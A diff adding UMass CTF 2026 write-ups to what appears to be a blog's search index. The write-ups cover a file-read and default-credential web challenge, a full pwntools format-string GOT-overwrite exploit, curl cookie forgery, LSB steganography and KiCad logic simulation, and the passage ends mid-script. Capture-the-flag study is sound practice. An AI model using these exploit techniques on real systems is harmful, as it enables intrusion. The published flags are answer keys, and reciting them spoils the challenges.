@@ -12027,4 +12027,438 @@ objects.</p>
         <tag>osint</tag>
       </tags>
   </entry>
+  <entry>
+    <title>UMass CTF 2026 - Brick by Brick</title>
+    <url>/wp/umass2026/umassctf2026-brick-by-brick/</url>
+    <content><![CDATA[<blockquote>
+<p>I found this old portal for BrickWorks Co. They say their internal
+systems are secure, but I’m not so sure. Can you find the hidden admin
+dashboard and get the flag?</p>
+<p>我发现了这个 BrickWorks
+公司的旧门户网站。他们说他们的内部系统是安全的，但我不太确定。你能找到隐藏的管理仪表板并拿到旗帜吗？</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>The challenge provides a link to a web portal for BrickWorks Co. The
+goal is to find a hidden admin dashboard and retrieve the flag. Based on
+the hints, we should look for common files used to hide content from
+search engines and pay attention to URL parameters.</p>
+<h3 id="solution">Solution</h3>
+<ol type="1">
+<li><p><strong>Information Gathering</strong>: Checking
+<code>robots.txt</code> reveals several disallowed paths under
+<code>/internal-docs/</code>: <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /internal-docs/assembly-guide.txt</span><br><span class="line">Disallow: /internal-docs/it-onboarding.txt</span><br><span class="line">Disallow: /internal-docs/q3-report.txt</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>Vulnerability Discovery</strong>: Reading
+<code>/internal-docs/it-onboarding.txt</code> provides a crucial piece
+of information: &gt; Staff can access any file using the
+<code>?file=</code> parameter.</p>
+<p>This indicates a potential Local File Inclusion (LFI) or arbitrary
+file read vulnerability on the main page. The same document also
+mentions that credentials are stored in
+<code>config.php</code>.</p></li>
+<li><p><strong>Exploitation</strong>: By using the <code>?file=</code>
+parameter to read <code>config.php</code>
+(<code>/?file=config.php</code>), we find the location of the admin
+dashboard and a hint about credentials: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The admin dashboard is located at /dashboard-admin.php.</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADMIN_USER&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>);</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>Accessing the Flag</strong>: Navigating to
+<code>/dashboard-admin.php</code> and logging in with the default
+credentials (<code>administrator</code> / <code>administrator</code>)
+grants access to the dashboard and reveals the flag.</p></li>
+</ol>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UMass CTF 2026 - Brick City Office Space</title>
+    <url>/wp/umass2026/umassctf2026-brick-city-office-space/</url>
+    <content><![CDATA[<blockquote>
+<p>Help design the office space for Brick City’s new skyscraper! read
+flag.txt for design specifications.</p>
+<p><code>nc brick-city-office-space.pwn.ctf.umasscybersec.org 45001</code></p>
+</blockquote>
+<h3 id="enumeration">Enumeration</h3>
+<p>The challenge provides a 32-bit x86 Linux binary with the following
+protections:</p>
+<ul>
+<li><strong>RELRO:</strong> No RELRO (GOT is writable)</li>
+<li><strong>Stack Canary:</strong> No Canary</li>
+<li><strong>NX:</strong> Enabled</li>
+<li><strong>PIE:</strong> Disabled (Loads at
+<code>0x08048000</code>)</li>
+</ul>
+<p>Decompiling the <code>vuln</code> function reveals a clear
+<strong>Format String Vulnerability</strong>:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = fgets(format, <span class="number">592</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">printf</span>(format); <span class="comment">// &lt;--- Vulnerable call</span></span><br></pre></td></tr></table></figure>
+<p>The program allows multiple “redesigns,” enabling us to trigger the
+vulnerability several times in a single session. By sending
+<code>AAAA %p %p %p %p</code>, we confirm the format string offset is
+<strong>4</strong>.</p>
+<h3 id="exploitation-strategy">Exploitation Strategy</h3>
+<p>Since the binary has No RELRO and PIE is disabled, we can perform a
+standard GOT overwrite:</p>
+<ol type="1">
+<li><strong>Leak Libc:</strong> Use the first <code>printf</code> to
+leak a libc address from the GOT (e.g., <code>printf@GOT</code>).</li>
+<li><strong>Calculate Offsets:</strong> Determine the base address of
+libc and the absolute address of <code>system</code>.</li>
+<li><strong>GOT Overwrite:</strong> Trigger the “redesign” loop and send
+a payload to overwrite <code>printf@GOT</code> with the address of
+<code>system</code>.</li>
+<li><strong>Trigger Shell:</strong> Send the string
+<code>cat flag.txt</code> in the next iteration.
+<code>printf(format)</code> will execute
+<code>system("cat flag.txt")</code>.</li>
+</ol>
+<h3 id="solution">Solution</h3>
+<p>The following exploit uses <code>pwntools</code> to automate the
+process, carefully avoiding backticks (<code>`</code>) which the binary
+handles specially.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./BrickCityOfficeSpace&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;brick-city-office-space.pwn.ctf.umasscybersec.org&#x27;</span>, <span class="number">45001</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Leak libc</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&quot;|%4$s|&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">leaked_printf = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = leaked_printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Overwrite GOT</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"><span class="comment"># Avoid backticks (0x60) by adjusting the number of bytes written</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;, numbwritten=<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger system(&quot;cat flag.txt&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, <span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+        <tag>format-string</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UMass CTF 2026 - Browser Boss Fight</title>
+    <url>/wp/umass2026/umassctf2026-browser-boss-fight/</url>
+    <content><![CDATA[<blockquote>
+<p>This familiar brick castle is hiding something… can you break in and
+defeat the Koopa King?</p>
+<p>这座熟悉的砖砌城堡隐藏着什么……您能闯进去打败库巴王吗？</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>The challenge presents a Bowser-themed web portal. A quick look at
+the page source reveals client-side JavaScript that sabotages any login
+attempt by replacing the input key with
+<code>WEAK_NON_KOOPA_KNOCK</code> on submission.</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;key-form&#x27;</span>).<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> knockOnDoor = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    <span class="comment">// It replaces whatever they typed with &#x27;WEAK_NON_KOOPA_KNOCK&#x27;</span></span><br><span class="line">    knockOnDoor.<span class="property">value</span> = <span class="string">&quot;WEAK_NON_KOOPA_KNOCK&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>This implies we need to interact with the server directly, bypassing
+the browser’s UI logic.</p>
+<h3 id="solution">Solution</h3>
+<ol type="1">
+<li><p><strong>Reconnaissance</strong>: Checking the HTTP response
+headers with <code>curl -v</code> reveals a hidden message from Kamek:
+<code>Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")</code></p>
+<p>The key appears to be <code>under_the_doormat</code>.</p></li>
+<li><p><strong>Authentication Bypass</strong>: The challenge title and
+theme suggest the server expects a specific identity. Using the
+User-Agent <code>Bowser</code> and the discovered key, we can attempt a
+login: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -c cookies.txt -L http://browser-boss-fight.web.ctf.umasscybersec.org:32770/password-attempt \</span><br><span class="line">     -A <span class="string">&quot;Bowser&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;key=under_the_doormat&quot;</span></span><br></pre></td></tr></table></figure> The <code>-c cookies.txt</code> flag saves the
+session cookie for subsequent requests.</p></li>
+<li><p><strong>Defeating the Boss (Cookie Manipulation)</strong>: Upon
+redirecting to <code>/bowsers_castle.html</code>, the page claims the
+“axe” has been removed to prevent defeat. Inspecting the cookies reveals
+a <code>hasAxe=false</code> value. To proceed, we must manually override
+this cookie to <code>true</code>: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -b cookies.txt -b <span class="string">&quot;hasAxe=true&quot;</span> \</span><br><span class="line">     -A <span class="string">&quot;Bowser&quot;</span> \</span><br><span class="line">     -L http://browser-boss-fight.web.ctf.umasscybersec.org:32770/bowsers_castle.html</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>Victory</strong>: With the manipulated cookie, the server
+renders the victory page containing the flag.</p></li>
+</ol>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{br0k3n_1n_2_b0wz3r5_c4st13}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UMassCTF 2026 - Ninja-Nerds</title>
+    <url>/wp/umass2026/umassctf2026-ninja-nerds/</url>
+    <content><![CDATA[<blockquote>
+<p>where are your little ninja-nerds?</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>The challenge provided a single image file:
+<code>challenge.png</code>. Initial investigation focused on gathering
+basic information about the file and its metadata.</p>
+<ul>
+<li><strong>File Type:</strong> Standard PNG image (640x360).</li>
+<li><strong>Metadata:</strong> <code>exiftool</code> showed no unusual
+comments or hidden fields.</li>
+<li><strong>Strings:</strong> Running <code>strings</code> did not
+reveal the flag in plain text, suggesting it was encoded or hidden
+within the pixel data.</li>
+<li><strong>Embedded Files:</strong> <code>binwalk</code> did not detect
+any appended files (like zips or other images).</li>
+</ul>
+<p>Given that the file appeared to be a clean PNG with no obvious
+trailing data or metadata tricks, I suspected <strong>LSB (Least
+Significant Bit) Steganography</strong>. This technique hides data by
+slightly modifying the last bit of color values (Red, Green, or Blue),
+which is invisible to the human eye.</p>
+<h3 id="solution">Solution</h3>
+<p>To extract the hidden data, we can either use automated tools or a
+custom script to parse the LSBs from each color plane.</p>
+<h4 id="automated-approach">1. Automated Approach</h4>
+<p>Using <code>zsteg</code>, we can quickly scan for common LSB
+patterns: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg -E <span class="string">&quot;b1,b,lsb,xy&quot;</span> challenge.png | strings | grep <span class="string">&quot;UMASS&#123;&quot;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="manual-extraction-script">2. Manual Extraction Script</h4>
+<p>Alternatively, using the <code>Pillow</code> library in Python allows
+for precise extraction from specific color channels.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">image_path</span>):</span><br><span class="line">    img = PIL.Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    pixels = img.load()</span><br><span class="line">    width, height = img.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check Red (0), Green (1), and Blue (2) planes</span></span><br><span class="line">    <span class="keyword">for</span> plane <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        lsb_data = <span class="built_in">bytearray</span>()</span><br><span class="line">        current_byte = <span class="number">0</span></span><br><span class="line">        bit_count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                pixel = pixels[x, y]</span><br><span class="line">                bit = pixel[plane] &amp; <span class="number">1</span> <span class="comment"># Extract LSB</span></span><br><span class="line">                current_byte = (current_byte &lt;&lt; <span class="number">1</span>) | bit</span><br><span class="line">                bit_count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> bit_count == <span class="number">8</span>:</span><br><span class="line">                    lsb_data.append(current_byte)</span><br><span class="line">                    current_byte = <span class="number">0</span></span><br><span class="line">                    bit_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;UMASS&#123;&quot;</span> <span class="keyword">in</span> lsb_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found flag in Plane <span class="subst">&#123;plane&#125;</span>!&quot;</span>)</span><br><span class="line">            <span class="comment"># Logic to print the found string...</span></span><br></pre></td></tr></table></figure>
+<p>Running the extraction against the color planes reveals that the flag
+is hidden in the <strong>Blue channel (Plane 2)</strong>.</p>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{perfectly-hidden-ready-to-strike}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>forensics</tag>
+        <tag>steganography</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UMassCTF 2026 - Smart Brick v2</title>
+    <url>/wp/umass2026/umassctf2026-smart-brick-v2/</url>
+    <content><![CDATA[<blockquote>
+<p>I managed to get my hands on a design files from LEGO HQ. Apparently
+it is the design for the new Smart Brick v2. I want to analyze it but I
+don’t have the hardware to do so. Can you help me figure out what it
+does??
+我设法从乐高总部拿到了一份设计文件。我想对它进行分析，但我没有分析所需的硬件。你能帮我弄明白它是做什么的吗？</p>
+<p><strong>Hint 1:</strong> I think I have seen that file format before
+on an popular open-source eCAD software but I can’t remember which one…
+(我好像在一款流行的开源 eCAD 软件上见过这种文件格式，但记不清是哪一款了)
+<strong>Hint 2:</strong> Hmmm… there seem to be 7 inputs, I wonder what
+encoding uses only 7 bits? (嗯……似乎有 7 个输入，我想知道什么编码只使用
+7 位？) <strong>Hint 3:</strong> I found a great python library to
+interact with this file programmatically: kiutils (我发现了一个很棒的
+Python 库，可以通过编程与该文件交互：kiutils)</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>The challenge provides a KiCad PCB design file
+(<code>smart-brick-v2.kicad_pcb</code>) and asks to analyze it to
+discover its function. Hints suggest that the board uses a 7-bit
+encoding (ASCII) and points toward the <code>kiutils</code> Python
+library for programmatic analysis.</p>
+<p>Opening the file or inspecting the raw text reveals it is a
+<strong>KiCad 9.0</strong> board file. Key features identified:</p>
+<ul>
+<li><strong>Inputs:</strong> 7 nets labeled <code>/IN0</code> through
+<code>/IN6</code>. This confirms the hint about 7-bit encoding
+(ASCII).</li>
+<li><strong>Outputs:</strong> 19 LEDs (<code>D1</code>–<code>D19</code>)
+driven by 19 MOSFETs (<code>Q1</code>–<code>Q19</code>).</li>
+<li><strong>Logic:</strong> A large array of <strong>74LS
+series</strong> discrete logic gates (AND, NAND, OR, NOR, XOR,
+NOT).</li>
+</ul>
+<p>The circuit is a combinational logic “decoder” where each LED
+represents a character in the flag. An LED will light up if the 7-bit
+input matches a specific character programmed into the logic gates for
+that stage.</p>
+<h3 id="solution">Solution</h3>
+<p>To solve this without physical hardware or a manual schematic trace,
+we can automate the logic extraction and simulation using Python.</p>
+<h4 id="technical-approach">1. Technical Approach</h4>
+<p><strong>Step 1: Parsing the PCB</strong> Using the
+<code>kiutils</code> library, we extract all footprints, their values
+(e.g., <code>74LS00</code>), and the nets connected to their pins.</p>
+<p><strong>Step 2: Mapping Logic Gates</strong> Each 74LS chip contains
+multiple gates. For example: - <code>74LS00</code>: Quad 2-input NAND. -
+<code>74LS08</code>: Quad 2-input AND. - <code>74LS86</code>: Quad
+2-input XOR. - <code>74LS21</code>: Dual 4-input AND.</p>
+<p>We build a dependency graph where each net’s value is determined by
+the boolean operation of its input nets.</p>
+<p><strong>Step 3: Simulation</strong> Since there are only 128 possible
+values for a 7-bit input (ASCII 0–127), we can brute-force the inputs
+for each of the 19 output stages. For each character <code>c</code> from
+0 to 127, we propagate the values through the logic gate graph and check
+which MOSFET gates (<code>Q1</code>–<code>Q19</code>) are pulled
+HIGH.</p>
+<h4 id="execution">2. Execution</h4>
+<p>The simulation reveals that each LED corresponds to exactly one ASCII
+character:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">LED</th>
+<th style="text-align: left;">Hex</th>
+<th style="text-align: left;">Char</th>
+<th style="text-align: left;">LED</th>
+<th style="text-align: left;">Hex</th>
+<th style="text-align: left;">Char</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">D1</td>
+<td style="text-align: left;">0x55</td>
+<td style="text-align: left;"><strong>U</strong></td>
+<td style="text-align: left;">D11</td>
+<td style="text-align: left;">0x68</td>
+<td style="text-align: left;"><strong>h</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D2</td>
+<td style="text-align: left;">0x4D</td>
+<td style="text-align: left;"><strong>M</strong></td>
+<td style="text-align: left;">D12</td>
+<td style="text-align: left;">0x33</td>
+<td style="text-align: left;"><strong>3</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D3</td>
+<td style="text-align: left;">0x41</td>
+<td style="text-align: left;"><strong>A</strong></td>
+<td style="text-align: left;">D13</td>
+<td style="text-align: left;">0x5F</td>
+<td style="text-align: left;"><strong>_</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D4</td>
+<td style="text-align: left;">0x53</td>
+<td style="text-align: left;"><strong>S</strong></td>
+<td style="text-align: left;">D14</td>
+<td style="text-align: left;">0x47</td>
+<td style="text-align: left;"><strong>G</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D5</td>
+<td style="text-align: left;">0x53</td>
+<td style="text-align: left;"><strong>S</strong></td>
+<td style="text-align: left;">D15</td>
+<td style="text-align: left;">0x34</td>
+<td style="text-align: left;"><strong>4</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D6</td>
+<td style="text-align: left;">0x7B</td>
+<td style="text-align: left;"><strong>{</strong></td>
+<td style="text-align: left;">D16</td>
+<td style="text-align: left;">0x74</td>
+<td style="text-align: left;"><strong>t</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D7</td>
+<td style="text-align: left;">0x49</td>
+<td style="text-align: left;"><strong>I</strong></td>
+<td style="text-align: left;">D17</td>
+<td style="text-align: left;">0x33</td>
+<td style="text-align: left;"><strong>3</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D8</td>
+<td style="text-align: left;">0x6E</td>
+<td style="text-align: left;"><strong>n</strong></td>
+<td style="text-align: left;">D18</td>
+<td style="text-align: left;">0x73</td>
+<td style="text-align: left;"><strong>s</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D9</td>
+<td style="text-align: left;">0x5F</td>
+<td style="text-align: left;"><strong>_</strong></td>
+<td style="text-align: left;">D19</td>
+<td style="text-align: left;">0x7D</td>
+<td style="text-align: left;"><strong>}</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;">D10</td>
+<td style="text-align: left;">0x54</td>
+<td style="text-align: left;"><strong>T</strong></td>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"></td>
+</tr>
+</tbody>
+</table>
+<h4 id="simulation-script">3. Simulation Script</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> kiutils.board <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_logic</span>():</span><br><span class="line">    board = Board.from_file(<span class="string">&#x27;smart-brick-v2.kicad_pcb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Map components by reference</span></span><br><span class="line">    components = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> fp <span class="keyword">in</span> board.footprints:</span><br><span class="line">        ref = fp.properties.get(<span class="string">&#x27;Reference&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        val = fp.properties.get(<span class="string">&#x27;Value&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pins = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> pad <span class="keyword">in</span> fp.pads:</span><br><span class="line">            <span class="keyword">if</span> pad.net:</span><br><span class="line">                pins[pad.number] = pad.net.name</span><br><span class="line"></span><br><span class="line">        components[ref] = &#123;</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: val,</span><br><span class="line">            <span class="string">&#x27;pins&#x27;</span>: pins</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define gate logic</span></span><br><span class="line">    <span class="comment"># (inputs, output)</span></span><br><span class="line">    gate_defs = &#123;</span><br><span class="line">        <span class="string">&#x27;74LS00&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># NAND</span></span><br><span class="line">        <span class="string">&#x27;74LS02&#x27;</span>: [((<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>), <span class="string">&#x27;1&#x27;</span>), ((<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>), <span class="string">&#x27;4&#x27;</span>), ((<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>), <span class="string">&#x27;10&#x27;</span>), ((<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), <span class="string">&#x27;13&#x27;</span>)], <span class="comment"># NOR</span></span><br><span class="line">        <span class="string">&#x27;74LS04&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>,), <span class="string">&#x27;2&#x27;</span>), ((<span class="string">&#x27;3&#x27;</span>,), <span class="string">&#x27;4&#x27;</span>), ((<span class="string">&#x27;5&#x27;</span>,), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>,), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;11&#x27;</span>,), <span class="string">&#x27;10&#x27;</span>), ((<span class="string">&#x27;13&#x27;</span>,), <span class="string">&#x27;12&#x27;</span>)], <span class="comment"># NOT</span></span><br><span class="line">        <span class="string">&#x27;74LS08&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># AND</span></span><br><span class="line">        <span class="string">&#x27;74LS20&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># NAND 4</span></span><br><span class="line">        <span class="string">&#x27;74LS21&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># AND 4</span></span><br><span class="line">        <span class="string">&#x27;74LS27&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;12&#x27;</span>), ((<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;11&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># NOR 3</span></span><br><span class="line">        <span class="string">&#x27;74LS32&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># OR</span></span><br><span class="line">        <span class="string">&#x27;74LS86&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># XOR</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the net dependency graph</span></span><br><span class="line">    net_logic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ref, comp <span class="keyword">in</span> components.items():</span><br><span class="line">        val = comp[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val <span class="keyword">in</span> gate_defs:</span><br><span class="line">            <span class="keyword">for</span> inputs, output <span class="keyword">in</span> gate_defs[val]:</span><br><span class="line">                <span class="keyword">if</span> output <span class="keyword">in</span> comp[<span class="string">&#x27;pins&#x27;</span>]:</span><br><span class="line">                    out_net = comp[<span class="string">&#x27;pins&#x27;</span>][output]</span><br><span class="line">                    in_nets = [comp[<span class="string">&#x27;pins&#x27;</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> inputs <span class="keyword">if</span> i <span class="keyword">in</span> comp[<span class="string">&#x27;pins&#x27;</span>]]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(in_nets) == <span class="built_in">len</span>(inputs):</span><br><span class="line">                        op = val[<span class="number">4</span>:] <span class="comment"># 00, 02, etc.</span></span><br><span class="line">                        net_logic[out_net] = (op, in_nets)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MOSFET gates driving LEDs</span></span><br><span class="line">    led_nets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> 